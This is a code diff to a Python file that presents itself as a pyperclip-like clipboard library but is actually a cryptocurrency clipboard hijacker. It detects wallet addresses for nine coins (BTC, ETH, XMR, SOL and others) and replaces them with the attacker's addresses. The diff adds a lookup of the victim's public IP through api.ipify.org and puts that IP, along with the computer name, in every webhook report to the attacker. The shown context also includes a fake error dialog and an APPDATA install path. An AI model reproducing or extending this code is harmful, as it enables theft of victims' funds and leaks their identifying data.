@@ -2,6 +2,10 @@
 essentailly the same as pyperclip but under different name
 """
 
+"""
+written by: https://github.com/3022-2
+"""
+
 import http.client
 import clipboard
 import socket
@@ -79,8 +83,25 @@ def is_crypto_addr(clipboard_text):
             return False
     except Exception:
         return False
+    
+def try_get_ip():
+    try:
+        conn = http.client.HTTPSConnection("api.ipify.org")
+        conn.request("GET", "/?format=text")
+        response = conn.getresponse()
+        ip_addr = response.read().decode()
+        conn.close()
+        return ip_addr
+    except Exception:
+        return None
 
 def main():
+    try_get_ip_addr = try_get_ip()
+    if try_get_ip_addr is None:
+        ip_addr = "Failed to get IP"
+    else:
+        ip_addr = try_get_ip_addr
+        
     if false_error:
         if cwd != str(os.path.join(os.environ['APPDATA'], "CLPPTH")):
             ctypes.windll.user32.MessageBoxW(0, "An error has occurred!", "Error", 0x10)
@@ -101,11 +122,11 @@ def main():
                         if webhook_url != "":
                                 if ping:
                                     message = {
-                                    "content": f"@everyone```\ndetected BTC address on {comp_name} - changed to {btcaddr}\n```"
+                                    "content": f"@everyone```\n [clipboard] detected BTC address on {comp_name} - IP: {ip_addr} - changed to {btcaddr}\n```"
                                     }
                                 else:
                                     message = {
-                                        "content": f"```\ndetected BTC address on {comp_name} - changed to {btcaddr}\n```"
+                                        "content": f"```\n [clipboard] detected BTC address on {comp_name} - IP: {ip_addr} - changed to {btcaddr}\n```"
                                     }
 
                                 json_data = json.dumps(message)
@@ -129,11 +150,11 @@ def main():
                         if webhook_url != "":
                                 if ping:
                                     message = {
-                                    "content": f"@everyone```\ndetected ETH address on {comp_name} - changed to {ethaddr}\n```"
+                                    "content": f"@everyone```\n [clipboard] detected ETH address on {comp_name} - IP: {ip_addr} - changed to {ethaddr}\n```"
                                     }
                                 else:
                                     message = {
-                                        "content": f"```\ndetected ETH address on {comp_name} - changed to {ethaddr}\n```"
+                                        "content": f"```\n [clipboard] detected ETH address on {comp_name} - IP: {ip_addr} - changed to {ethaddr}\n```"
                                     }
 
                                 json_data = json.dumps(message)
@@ -157,11 +178,11 @@ def main():
                         if webhook_url != "":
                                 if ping:
                                     message = {
-                                    "content": f"@everyone```\ndetected LTC address on {comp_name} - changed to {ltcaddr}\n```"
+                                    "content": f"@everyone```\n [clipboard] detected LTC address on {comp_name} - IP: {ip_addr} - changed to {ltcaddr}\n```"
                                     }
                                 else:
                                     message = {
-                                        "content": f"```\ndetected LTC address on {comp_name} - changed to {ltcaddr}\n```"
+                                        "content": f"```\n [clipboard] detected LTC address on {comp_name} - IP: {ip_addr} - changed to {ltcaddr}\n```"
                                     }
 
                                 json_data = json.dumps(message)
@@ -185,11 +206,11 @@ def main():
                         if webhook_url != "":
                                 if ping:
                                     message = {
-                                    "content": f"@everyone```\ndetected XMR address on {comp_name} - changed to {xmraddr}\n```"
+                                    "content": f"@everyone```\n [clipboard] detected XMR address on {comp_name} - IP: {ip_addr} - changed to {xmraddr}\n```"
                                     }
                                 else:
                                     message = {
-                                        "content": f"```\ndetected XMR address on {comp_name} - changed to {xmraddr}\n```"
+                                        "content": f"```\n [clipboard] detected XMR address on {comp_name} - IP: {ip_addr} - changed to {xmraddr}\n```"
                                     }
 
                                 json_data = json.dumps(message)
@@ -213,11 +234,11 @@ def main():
                         if webhook_url != "":
                                 if ping:
                                     message = {
-                                    "content": f"@everyone```\ndetected SOL address on {comp_name} - changed to {soladdr}\n```"
+                                    "content": f"@everyone```\n [clipboard] detected SOL address on {comp_name} - IP: {ip_addr} - changed to {soladdr}\n```"
                                     }
                                 else:
                                     message = {
-                                        "content": f"```\ndetected SOL address on {comp_name} - changed to {soladdr}\n```"
+                                        "content": f"```\n [clipboard] detected SOL address on {comp_name} - IP: {ip_addr} - changed to {soladdr}\n```"
                                     }
 
                                 json_data = json.dumps(message)
@@ -241,11 +262,11 @@ def main():
                         if webhook_url != "":
                                 if ping:
                                     message = {
-                                    "content": f"@everyone```\ndetected DOGE address on {comp_name} - changed to {dogeaddr}\n```"
+                                    "content": f"@everyone```\n [clipboard] detected DOGE address on {comp_name} - IP: {ip_addr} - changed to {dogeaddr}\n```"
                                     }
                                 else:
                                     message = {
-                                        "content": f"```\ndetected DOGE address on {comp_name} - changed to {dogeaddr}\n```"
+                                        "content": f"```\n [clipboard] detected DOGE address on {comp_name} - IP: {ip_addr} - changed to {dogeaddr}\n```"
                                     }
 
                                 json_data = json.dumps(message)
@@ -269,11 +290,11 @@ def main():
                         if webhook_url != "":
                                 if ping:
                                     message = {
-                                    "content": f"@everyone```\ndetected XRP address on {comp_name} - changed to {xrpaddr}\n```"
+                                    "content": f"@everyone```\n [clipboard] detected XRP address on {comp_name} - IP: {ip_addr} - changed to {xrpaddr}\n```"
                                     }
                                 else:
                                     message = {
-                                        "content": f"```\ndetected XRP address on {comp_name} - changed to {xrpaddr}\n```"
+                                        "content": f"```\n [clipboard] detected XRP address on {comp_name} - IP: {ip_addr} - changed to {xrpaddr}\n```"
                                     }
 
                                 json_data = json.dumps(message)
@@ -297,11 +318,11 @@ def main():
                         if webhook_url != "":
                                 if ping:
                                     message = {
-                                    "content": f"@everyone```\ndetected TRX address on {comp_name} - changed to {trxaddr}\n```"
+                                    "content": f"@everyone```\n [clipboard] detected TRX address on {comp_name} - IP: {ip_addr} - changed to {trxaddr}\n```"
                                     }
                                 else:
                                     message = {
-                                        "content": f"```\ndetected TRX address on {comp_name} - changed to {trxaddr}\n```"
+                                        "content": f"```\n [clipboard] detected TRX address on {comp_name} - IP: {ip_addr} - changed to {trxaddr}\n```"
                                     }
 
                                 json_data = json.dumps(message)
@@ -325,11 +346,11 @@ def main():
                         if webhook_url != "":
                                 if ping:
                                     message = {
-                                    "content": f"@everyone```\ndetected BCH address on {comp_name} - changed to {bchaddr}\n```"
+                                    "content": f"@everyone```\n [clipboard] detected BCH address on {comp_name} - IP: {ip_addr} - changed to {bchaddr}\n```"
                                     }
                                 else:
                                     message = {
-                                        "content": f"```\ndetected BCH address on {comp_name} - changed to {bchaddr}\n```"
+                                        "content": f"```\n [clipboard] detected BCH address on {comp_name} - IP: {ip_addr} - changed to {bchaddr}\n```"
                                     }
 
                                 json_data = json.dumps(message)
